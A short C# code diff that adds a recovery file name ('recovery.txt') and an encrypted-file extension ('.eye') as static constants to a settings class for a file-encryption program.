@@ -31,5 +31,12 @@
         /// File Encryption Digital Initial Vector.
         /// </summary>
         public static byte[] _FE_DV { get; set; }
+
+        /// <summary>
+        /// Name of the Recovery file.
+        /// </summary>
+        public static string _RecoveryFileName = "recovery.txt";
+
+        public static string _EncryptedFileExtension = ".eye";
     }
 }
